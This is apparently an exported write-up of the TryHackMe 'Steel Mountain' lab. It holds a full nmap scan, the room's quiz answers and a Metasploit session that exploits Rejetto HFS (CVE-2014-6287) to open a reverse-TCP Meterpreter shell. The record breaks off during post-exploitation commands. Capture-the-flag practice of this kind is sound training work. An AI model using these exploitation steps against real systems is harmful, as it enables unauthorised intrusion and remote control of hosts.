<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>Steel Mountain</title><style>
/* cspell:disable-file */
/* webkit printing magic: print all background colors */
html {
	-webkit-print-color-adjust: exact;
}
* {
	box-sizing: border-box;
	-webkit-print-color-adjust: exact;
}

html,
body {
	margin: 0;
	padding: 0;
}
@media only screen {
	body {
		margin: 2em auto;
		max-width: 900px;
		color: rgb(55, 53, 47);
	}
}

body {
	line-height: 1.5;
	white-space: pre-wrap;
}

a,
a.visited {
	color: inherit;
	text-decoration: underline;
}

.pdf-relative-link-path {
	font-size: 80%;
	color: #444;
}

h1,
h2,
h3 {
	letter-spacing: -0.01em;
	line-height: 1.2;
	font-weight: 600;
	margin-bottom: 0;
}

.page-title {
	font-size: 2.5rem;
	font-weight: 700;
	margin-top: 0;
	margin-bottom: 0.75em;
}

h1 {
	font-size: 1.875rem;
	margin-top: 1.875rem;
}

h2 {
	font-size: 1.5rem;
	margin-top: 1.5rem;
}

h3 {
	font-size: 1.25rem;
	margin-top: 1.25rem;
}

.source {
	border: 1px solid #ddd;
	border-radius: 3px;
	padding: 1.5em;
	word-break: break-all;
}

.callout {
	border-radius: 3px;
	padding: 1rem;
}

figure {
	margin: 1.25em 0;
	page-break-inside: avoid;
}

figcaption {
	opacity: 0.5;
	font-size: 85%;
	margin-top: 0.5em;
}

mark {
	background-color: transparent;
}

.indented {
	padding-left: 1.5em;
}

hr {
	background: transparent;
	display: block;
	width: 100%;
	height: 1px;
	visibility: visible;
	border: none;
	border-bottom: 1px solid rgba(55, 53, 47, 0.09);
}

img {
	max-width: 100%;
}

@media only print {
	img {
		max-height: 100vh;
		object-fit: contain;
	}
}

@page {
	margin: 1in;
}

.collection-content {
	font-size: 0.875rem;
}

.column-list {
	display: flex;
	justify-content: space-between;
}

.column {
	padding: 0 1em;
}

.column:first-child {
	padding-left: 0;
}

.column:last-child {
	padding-right: 0;
}

.table_of_contents-item {
	display: block;
	font-size: 0.875rem;
	line-height: 1.3;
	padding: 0.125rem;
}

.table_of_contents-indent-1 {
	margin-left: 1.5rem;
}

.table_of_contents-indent-2 {
	margin-left: 3rem;
}

.table_of_contents-indent-3 {
	margin-left: 4.5rem;
}

.table_of_contents-link {
	text-decoration: none;
	opacity: 0.7;
	border-bottom: 1px solid rgba(55, 53, 47, 0.18);
}

table,
th,
td {
	border: 1px solid rgba(55, 53, 47, 0.09);
	border-collapse: collapse;
}

table {
	border-left: none;
	border-right: none;
}

th,
td {
	font-weight: normal;
	padding: 0.25em 0.5em;
	line-height: 1.5;
	min-height: 1.5em;
	text-align: left;
}

th {
	color: rgba(55, 53, 47, 0.6);
}

ol,
ul {
	margin: 0;
	margin-block-start: 0.6em;
	margin-block-end: 0.6em;
}

li > ol:first-child,
li > ul:first-child {
	margin-block-start: 0.6em;
}

ul > li {
	list-style: disc;
}

ul.to-do-list {
	text-indent: -1.7em;
}

ul.to-do-list > li {
	list-style: none;
}

.to-do-children-checked {
	text-decoration: line-through;
	opacity: 0.375;
}

ul.toggle > li {
	list-style: none;
}

ul {
	padding-inline-start: 1.7em;
}

ul > li {
	padding-left: 0.1em;
}

ol {
	padding-inline-start: 1.6em;
}

ol > li {
	padding-left: 0.2em;
}

.mono ol {
	padding-inline-start: 2em;
}

.mono ol > li {
	text-indent: -0.4em;
}

.toggle {
	padding-inline-start: 0em;
	list-style-type: none;
}

/* Indent toggle children */
.toggle > li > details {
	padding-left: 1.7em;
}

.toggle > li > details > summary {
	margin-left: -1.1em;
}

.selected-value {
	display: inline-block;
	padding: 0 0.5em;
	background: rgba(206, 205, 202, 0.5);
	border-radius: 3px;
	margin-right: 0.5em;
	margin-top: 0.3em;
	margin-bottom: 0.3em;
	white-space: nowrap;
}

.collection-title {
	display: inline-block;
	margin-right: 1em;
}

.simple-table {
	margin-top: 1em;
	font-size: 0.875rem;
	empty-cells: show;
}
.simple-table td {
	height: 29px;
	min-width: 120px;
}

.simple-table th {
	height: 29px;
	min-width: 120px;
}

.simple-table-header-color {
	background: rgb(247, 246, 243);
	color: black;
}
.simple-table-header {
	font-weight: 500;
}

time {
	opacity: 0.5;
}

.icon {
	display: inline-block;
	max-width: 1.2em;
	max-height: 1.2em;
	text-decoration: none;
	vertical-align: text-bottom;
	margin-right: 0.5em;
}

img.icon {
	border-radius: 3px;
}

.user-icon {
	width: 1.5em;
	height: 1.5em;
	border-radius: 100%;
	margin-right: 0.5rem;
}

.user-icon-inner {
	font-size: 0.8em;
}

.text-icon {
	border: 1px solid #000;
	text-align: center;
}

.page-cover-image {
	display: block;
	object-fit: cover;
	width: 100%;
	max-height: 30vh;
}

.page-header-icon {
	font-size: 3rem;
	margin-bottom: 1rem;
}

.page-header-icon-with-cover {
	margin-top: -0.72em;
	margin-left: 0.07em;
}

.page-header-icon img {
	border-radius: 3px;
}

.link-to-page {
	margin: 1em 0;
	padding: 0;
	border: none;
	font-weight: 500;
}

p > .user {
	opacity: 0.5;
}

td > .user,
td > time {
	white-space: nowrap;
}

input[type="checkbox"] {
	transform: scale(1.5);
	margin-right: 0.6em;
	vertical-align: middle;
}

p {
	margin-top: 0.5em;
	margin-bottom: 0.5em;
}

.image {
	border: none;
	margin: 1.5em 0;
	padding: 0;
	border-radius: 0;
	text-align: center;
}

.code,
code {
	background: rgba(135, 131, 120, 0.15);
	border-radius: 3px;
	padding: 0.2em 0.4em;
	border-radius: 3px;
	font-size: 85%;
	tab-size: 2;
}

code {
	color: #eb5757;
}

.code {
	padding: 1.5em 1em;
}

.code-wrap {
	white-space: pre-wrap;
	word-break: break-all;
}

.code > code {
	background: none;
	padding: 0;
	font-size: 100%;
	color: inherit;
}

blockquote {
	font-size: 1.25em;
	margin: 1em 0;
	padding-left: 1em;
	border-left: 3px solid rgb(55, 53, 47);
}

.bookmark {
	text-decoration: none;
	max-height: 8em;
	padding: 0;
	display: flex;
	width: 100%;
	align-items: stretch;
}

.bookmark-title {
	font-size: 0.85em;
	overflow: hidden;
	text-overflow: ellipsis;
	height: 1.75em;
	white-space: nowrap;
}

.bookmark-text {
	display: flex;
	flex-direction: column;
}

.bookmark-info {
	flex: 4 1 180px;
	padding: 12px 14px 14px;
	display: flex;
	flex-direction: column;
	justify-content: space-between;
}

.bookmark-image {
	width: 33%;
	flex: 1 1 180px;
	display: block;
	position: relative;
	object-fit: cover;
	border-radius: 1px;
}

.bookmark-description {
	color: rgba(55, 53, 47, 0.6);
	font-size: 0.75em;
	overflow: hidden;
	max-height: 4.5em;
	word-break: break-word;
}

.bookmark-href {
	font-size: 0.75em;
	margin-top: 0.25em;
}

.sans { font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
.code { font-family: "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace; }
.serif { font-family: Lyon-Text, Georgia, ui-serif, serif; }
.mono { font-family: iawriter-mono, Nitti, Menlo, Courier, monospace; }
.pdf .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK JP'; }
.pdf:lang(zh-CN) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC'; }
.pdf:lang(zh-TW) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK TC'; }
.pdf:lang(ko-KR) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK KR'; }
.pdf .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
.pdf:lang(zh-CN) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
.pdf:lang(zh-TW) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
.pdf:lang(ko-KR) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK JP'; }
.pdf:lang(zh-CN) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK SC'; }
.pdf:lang(zh-TW) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK TC'; }
.pdf:lang(ko-KR) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK KR'; }
.pdf .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
.pdf:lang(zh-CN) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
.pdf:lang(zh-TW) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
.pdf:lang(ko-KR) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
.highlight-default {
	color: rgba(55, 53, 47, 1);
}
.highlight-gray {
	color: rgba(120, 119, 116, 1);
	fill: rgba(120, 119, 116, 1);
}
.highlight-brown {
	color: rgba(159, 107, 83, 1);
	fill: rgba(159, 107, 83, 1);
}
.highlight-orange {
	color: rgba(217, 115, 13, 1);
	fill: rgba(217, 115, 13, 1);
}
.highlight-yellow {
	color: rgba(203, 145, 47, 1);
	fill: rgba(203, 145, 47, 1);
}
.highlight-teal {
	color: rgba(68, 131, 97, 1);
	fill: rgba(68, 131, 97, 1);
}
.highlight-blue {
	color: rgba(51, 126, 169, 1);
	fill: rgba(51, 126, 169, 1);
}
.highlight-purple {
	color: rgba(144, 101, 176, 1);
	fill: rgba(144, 101, 176, 1);
}
.highlight-pink {
	color: rgba(193, 76, 138, 1);
	fill: rgba(193, 76, 138, 1);
}
.highlight-red {
	color: rgba(212, 76, 71, 1);
	fill: rgba(212, 76, 71, 1);
}
.highlight-gray_background {
	background: rgba(241, 241, 239, 1);
}
.highlight-brown_background {
	background: rgba(244, 238, 238, 1);
}
.highlight-orange_background {
	background: rgba(251, 236, 221, 1);
}
.highlight-yellow_background {
	background: rgba(251, 243, 219, 1);
}
.highlight-teal_background {
	background: rgba(237, 243, 236, 1);
}
.highlight-blue_background {
	background: rgba(231, 243, 248, 1);
}
.highlight-purple_background {
	background: rgba(244, 240, 247, 0.8);
}
.highlight-pink_background {
	background: rgba(249, 238, 243, 0.8);
}
.highlight-red_background {
	background: rgba(253, 235, 236, 1);
}
.block-color-default {
	color: inherit;
	fill: inherit;
}
.block-color-gray {
	color: rgba(120, 119, 116, 1);
	fill: rgba(120, 119, 116, 1);
}
.block-color-brown {
	color: rgba(159, 107, 83, 1);
	fill: rgba(159, 107, 83, 1);
}
.block-color-orange {
	color: rgba(217, 115, 13, 1);
	fill: rgba(217, 115, 13, 1);
}
.block-color-yellow {
	color: rgba(203, 145, 47, 1);
	fill: rgba(203, 145, 47, 1);
}
.block-color-teal {
	color: rgba(68, 131, 97, 1);
	fill: rgba(68, 131, 97, 1);
}
.block-color-blue {
	color: rgba(51, 126, 169, 1);
	fill: rgba(51, 126, 169, 1);
}
.block-color-purple {
	color: rgba(144, 101, 176, 1);
	fill: rgba(144, 101, 176, 1);
}
.block-color-pink {
	color: rgba(193, 76, 138, 1);
	fill: rgba(193, 76, 138, 1);
}
.block-color-red {
	color: rgba(212, 76, 71, 1);
	fill: rgba(212, 76, 71, 1);
}
.block-color-gray_background {
	background: rgba(241, 241, 239, 1);
}
.block-color-brown_background {
	background: rgba(244, 238, 238, 1);
}
.block-color-orange_background {
	background: rgba(251, 236, 221, 1);
}
.block-color-yellow_background {
	background: rgba(251, 243, 219, 1);
}
.block-color-teal_background {
	background: rgba(237, 243, 236, 1);
}
.block-color-blue_background {
	background: rgba(231, 243, 248, 1);
}
.block-color-purple_background {
	background: rgba(244, 240, 247, 0.8);
}
.block-color-pink_background {
	background: rgba(249, 238, 243, 0.8);
}
.block-color-red_background {
	background: rgba(253, 235, 236, 1);
}
.select-value-color-pink { background-color: rgba(245, 224, 233, 1); }
.select-value-color-purple { background-color: rgba(232, 222, 238, 1); }
.select-value-color-green { background-color: rgba(219, 237, 219, 1); }
.select-value-color-gray { background-color: rgba(227, 226, 224, 1); }
.select-value-color-opaquegray { background-color: rgba(255, 255, 255, 0.0375); }
.select-value-color-orange { background-color: rgba(250, 222, 201, 1); }
.select-value-color-brown { background-color: rgba(238, 224, 218, 1); }
.select-value-color-red { background-color: rgba(255, 226, 221, 1); }
.select-value-color-yellow { background-color: rgba(253, 236, 200, 1); }
.select-value-color-blue { background-color: rgba(211, 229, 239, 1); }

.checkbox {
	display: inline-flex;
	vertical-align: text-bottom;
	width: 16;
	height: 16;
	background-size: 16px;
	margin-left: 2px;
	margin-right: 5px;
}

.checkbox-on {
	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
}

.checkbox-off {
	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
}
	
</style></head><body><article id="1aaf0322-439c-481f-ac5e-dd3ba2c32f77" class="page sans"><header><h1 class="page-title">Steel Mountain</h1></header><div class="page-body"><p id="2fc33a64-c7c4-49fc-bf46-ed70fd8a9c31" class="">
</p><pre id="4e9bed11-225d-41b8-9896-a112b741ec90" class="code"><code>â”Œâ”€â”€(rootðŸ’€kali)-[~]
â””â”€# ifconfig                                                                                                                                                                                                                           12
eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500
inet 192.168.57.4  netmask 255.255.255.0  broadcast 192.168.57.255
inet6 fe80::a00:27ff:fe0e:348d  prefixlen 64  scopeid 0x20&lt;link&gt;
ether 08:00:27:0e:34:8d  txqueuelen 1000  (Ethernet)
RX packets 3618  bytes 1304357 (1.2 MiB)
RX errors 0  dropped 0  overruns 0  frame 0
TX packets 4487  bytes 2840476 (2.7 MiB)
TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536
inet 127.0.0.1  netmask 255.0.0.0
inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;
loop  txqueuelen 1000  (Local Loopback)
RX packets 153  bytes 32530 (31.7 KiB)
RX errors 0  dropped 0  overruns 0  frame 0
TX packets 153  bytes 32530 (31.7 KiB)
TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

tun0: flags=4305&lt;UP,POINTOPOINT,RUNNING,NOARP,MULTICAST&gt;  mtu 1500
inet 10.2.23.54  netmask 255.255.128.0  destination 10.2.23.54
inet6 fe80::3836:3673:7d3d:84b0  prefixlen 64  scopeid 0x20&lt;link&gt;
unspec 00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00  txqueuelen 500  (UNSPEC)
RX packets 2077  bytes 300937 (293.8 KiB)
RX errors 0  dropped 0  overruns 0  frame 0
TX packets 2903  bytes 2234976 (2.1 MiB)
TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</code></pre><p id="c4849710-6b2d-40b7-956f-e2c7dcc3d890" class="">
</p><h2 id="94a179fb-7903-4ce8-a959-6d05832633f3" class=""><mark class="highlight-blue">nmap Scan</mark></h2><p id="729da734-31c8-4115-9c1b-1ff39aacd05c" class="">
</p><pre id="5263c80e-4336-4548-8bd5-4c29fb5b029d" class="code"><code>â”Œâ”€â”€(rootðŸ’€kali)-[~]
â””â”€# nmap -T4 -p- -A 10.10.48.6
Starting Nmap 7.91 ( https://nmap.org ) at 2023-02-20 03:30 EST
Nmap scan report for 10.10.48.6
Host is up (0.37s latency).
Not shown: 65520 closed ports
PORT      STATE SERVICE            VERSION
80/tcp    open  http               Microsoft IIS httpd 8.5
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/8.5
|_http-title: Site doesn&#x27;t have a title (text/html).
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
3389/tcp  open  ssl/ms-wbt-server?
| ssl-cert: Subject: commonName=steelmountain
| Not valid before: 2023-02-19T07:58:45
|_Not valid after:  2023-08-21T07:58:45
|_ssl-date: 2023-02-20T08:43:41+00:00; +3s from scanner time.
5985/tcp  open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
8080/tcp  open  http               HttpFileServer httpd 2.3
|_http-server-header: HFS 2.3
|_http-title: HFS /
47001/tcp open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49155/tcp open  msrpc              Microsoft Windows RPC
49156/tcp open  msrpc              Microsoft Windows RPC
49169/tcp open  msrpc              Microsoft Windows RPC
49170/tcp open  msrpc              Microsoft Windows RPC
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=2/20%OT=80%CT=1%CU=40704%PV=Y%DS=4%DC=T%G=Y%TM=63F332B
OS:B%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=108%TI=I%CI=I%II=I%SS=S%TS=
OS:7)OPS(O1=M505NW8ST11%O2=M505NW8ST11%O3=M505NW8NNT11%O4=M505NW8ST11%O5=M5
OS:05NW8ST11%O6=M505ST11)WIN(W1=2000%W2=2000%W3=2000%W4=2000%W5=2000%W6=200
OS:0)ECN(R=Y%DF=Y%T=80%W=2000%O=M505NW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S
OS:+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%
OS:T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=
OS:0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%
OS:S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(
OS:R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=
OS:N%T=80%CD=Z)
Network Distance: 4 hops
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
Host script results:
|clock-skew: mean: 2s, deviation: 0s, median: 1s
|nbstat: NetBIOS name: STEELMOUNTAIN, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 02:82:9c:47:28:0d (unknown)
| smb-security-mode:
|   authentication_level: user
|   challenge_response: supported
|  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   2.02:
|    Message signing enabled but not required
| smb2-time:
|   date: 2023-02-20T08:43:34
|_  start_date: 2023-02-20T07:58:36
TRACEROUTE (using port 1720/tcp)
HOP RTT       ADDRESS
1   234.36 ms 10.2.0.1
2   ... 3
4   372.45 ms 10.10.48.6
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 813.59 seconds</code></pre><h2 id="00300039-67f5-44b9-af25-23a8e8555114" class="">
<mark class="highlight-blue">Enumeration</mark></h2><p id="9e37cab4-cbf2-43d3-9624-36e6ca4cb75f" class="">
</p><figure class="block-color-gray_background callout" style="white-space:pre-wrap;display:flex" id="b8ecc7f1-09cb-48ca-8430-eab47f7948df"><div style="font-size:1.5em"><span class="icon">ðŸ’¡</span></div><div style="width:100%">Open interesting Ports:
<mark class="highlight-red">80/tcp    open  http               Microsoft IIS httpd 8.5
8080/tcp  open  http               HttpFileServer httpd 2.3</mark></div></figure><p id="983654f8-bf28-4eec-bbe2-b6a4d92634ad" class="">
</p><p id="4085a9d3-f996-48b9-bc57-89dc0084b686" class="">
</p><figure id="cc632d9f-ec79-487b-bd67-2fb58f5ee97b" class="image"><a href="Steel%20Mountain%201aaf0322439c481fac5edd3ba2c32f77/Untitled.png"><img style="width:1228px" src="../../images/tryhackme/steelmountain/Untitled.png"/></a></figure><p id="28358ae0-dcc1-4460-bc3f-2f091283855f" class="">
</p><blockquote id="d988ec61-10cb-4322-834d-0135373770dd" class=""><mark class="highlight-yellow">Question: Who is the employee of the month? </mark>
<mark class="highlight-teal">Answer: Bill Harper</mark>
</blockquote><p id="a178a1c6-5098-4f40-851a-0f013459dcb5" class="">
</p><blockquote id="0c211e1f-1d48-4287-b3ad-d998a5e1c782" class=""><mark class="highlight-yellow">Question: Scan the machine with nmap. What is the other port running a web server on?</mark>
<mark class="highlight-teal">Answer: 8080</mark></blockquote><p id="4bfb2538-9689-46ba-92a2-1f7f9c932559" class="">
</p><p id="b3a84c53-ae83-4d95-a4dc-213f09bd8684" class="">
</p><figure id="ca0ff887-0e4b-41b1-8207-225387f27a1b" class="image"><a href="Steel%20Mountain%201aaf0322439c481fac5edd3ba2c32f77/Untitled%201.png"><img style="width:563px" src="../../images/tryhackme/steelmountain/Untitled%201.png"/></a></figure><figure id="dc7b0b53-0cfc-44cd-b608-e2ff0b8de3da" class="image"><a href="../../images/tryhackme/steelmountain/Untitled%202.png"><img style="width:842px" src="../../images/tryhackme/steelmountain/Untitled%202.png"/></a></figure><p id="de7afbf7-eb2e-4f76-ac1c-0463da10e891" class="">
</p><blockquote id="ef794874-5890-4eda-96c4-f902f8860e0b" class=""><mark class="highlight-yellow">Question: Take a look at the other web server. What file server is running?</mark>
<mark class="highlight-teal">Answer: Rejetto HTTP File Server</mark></blockquote><p id="3b5e219d-6a76-4e50-a271-d291b0b12f7e" class="">
</p><blockquote id="a2f157e7-e029-4158-9bed-c1942e598a1a" class=""><mark class="highlight-yellow">Question: What is the CVE number to exploit this file server?</mark>
<mark class="highlight-teal">Answer: 2014-6287</mark></blockquote><p id="61e9d40a-cc16-44f1-8492-9de91cb20bbf" class="">
</p><h2 id="8064d746-0457-4f8f-976d-f9174ad27d81" class=""><mark class="highlight-blue">Initial Foothold</mark></h2><p id="5eb385f0-5f2d-428d-8a99-be6ee8cd255f" class="">
</p><pre id="eef4d8e6-9ea3-4b68-958a-baf37eed4323" class="code"><code>â”Œâ”€â”€(rootðŸ’€kali)-[~]
â””â”€# msfconsole
Metasploit Park, System Security Interface
Version 4.0.5, Alpha E
Ready...
access security
access: PERMISSION DENIED.
access security grids
access: PERMISSION DENIED.
access main security grid
access: PERMISSION DENIED....and...
YOU DIDN&#x27;T SAY THE MAGIC WORD!
YOU DIDN&#x27;T SAY THE MAGIC WORD!
YOU DIDN&#x27;T SAY THE MAGIC WORD!
YOU DIDN&#x27;T SAY THE MAGIC WORD!
YOU DIDN&#x27;T SAY THE MAGIC WORD!
YOU DIDN&#x27;T SAY THE MAGIC WORD!
YOU DIDN&#x27;T SAY THE MAGIC WORD!
   =[ metasploit v6.0.45-dev                          ]

- --=[ 2134 exploits - 1139 auxiliary - 364 post ]
- --=[ 592 payloads - 45 encoders - 10 nops ]
- --=[ 8 evasion ]
Metasploit tip: View missing module options with show
missing
msf6 &gt; search Rejetto
Matching Modules
Name Disclosure Date Rank Check Description
0  exploit/windows/http/rejetto_hfs_exec  2014-09-11       excellent  Yes    Rejetto HttpFileServer Remote Command Execution
Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/http/rejetto_hfs_exec
msf6 &gt; use 0
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/http/rejetto_hfs_exec) &gt; show options
Module options (exploit/windows/http/rejetto_hfs_exec):
Name       Current Setting  Required  Description
HTTPDELAY  10               no        Seconds to wait before terminating web server
Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax &#x27;file:&lt;path&gt;&#x27;
RPORT      80               yes       The target port (TCP)
SRVHOST    0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
SRVPORT    8080             yes       The local port to listen on.
SSL        false            no        Negotiate SSL/TLS for outgoing connections
SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
TARGETURI  /                yes       The path of the web application
URIPATH                     no        The URI to use for this exploit (default is random)
VHOST                       no        HTTP server virtual host
Payload options (windows/meterpreter/reverse_tcp):
Name      Current Setting  Required  Description
EXITFUNC  process          yes       Exit technique (Accepted: &#x27;&#x27;, seh, thread, process, none)
LHOST     192.168.57.4     yes       The listen address (an interface may be specified)
LPORT     4444             yes       The listen port
Exploit target:
Id  Name
0   Automatic
msf6 exploit(windows/http/rejetto_hfs_exec) &gt; set RHOSTS 10.10.48.6
RHOSTS =&gt; 10.10.48.6
msf6 exploit(windows/http/rejetto_hfs_exec) &gt; set RPORT 8080
RPORT =&gt; 8080
msf6 exploit(windows/http/rejetto_hfs_exec) &gt; show options
Module options (exploit/windows/http/rejetto_hfs_exec):
Name       Current Setting  Required  Description
HTTPDELAY  10               no        Seconds to wait before terminating web server
Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
RHOSTS     10.10.48.6       yes       The target host(s), range CIDR identifier, or hosts file with syntax &#x27;file:&lt;path&gt;&#x27;
RPORT      8080             yes       The target port (TCP)
SRVHOST    0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
SRVPORT    8080             yes       The local port to listen on.
SSL        false            no        Negotiate SSL/TLS for outgoing connections
SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
TARGETURI  /                yes       The path of the web application
URIPATH                     no        The URI to use for this exploit (default is random)
VHOST                       no        HTTP server virtual host
Payload options (windows/meterpreter/reverse_tcp):
Name      Current Setting  Required  Description
EXITFUNC  process          yes       Exit technique (Accepted: &#x27;&#x27;, seh, thread, process, none)
LHOST     192.168.57.4     yes       The listen address (an interface may be specified)
LPORT     4444             yes       The listen port
Exploit target:
Id  Name
0   Automatic
msf6 exploit(windows/http/rejetto_hfs_exec) &gt; set LHOST 10.2.23.54
LHOST =&gt; 10.2.23.54
msf6 exploit(windows/http/rejetto_hfs_exec) &gt; exploit
[] Started reverse TCP handler on 10.2.23.54:4444
[] Using URL: http://0.0.0.0:8080/n1PxrUR
[] Local IP: http://192.168.57.4:8080/n1PxrUR
[] Server started.
[] Sending a malicious request to /
[] Payload request received: /n1PxrUR
[] Sending stage (175174 bytes) to 10.10.48.6
[!] Tried to delete %TEMP%\fcglBL.vbs, unknown result
[] Meterpreter session 1 opened (10.2.23.54:4444 -&gt; 10.10.48.6:49275) at 2023-02-20 04:03:47 -0500
[*] Server stopped.
meterpreter &gt; getuid
Server username: STEELMOUNTAIN\bill
meterpreter &gt; sysinfo
Computer        : STEELMOUNTAIN
OS              : Windows 2012 R2 (6.3 Build 9600).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x86/windows
meterpreter &gt; getprivs
Enabled Process Privileges
Name
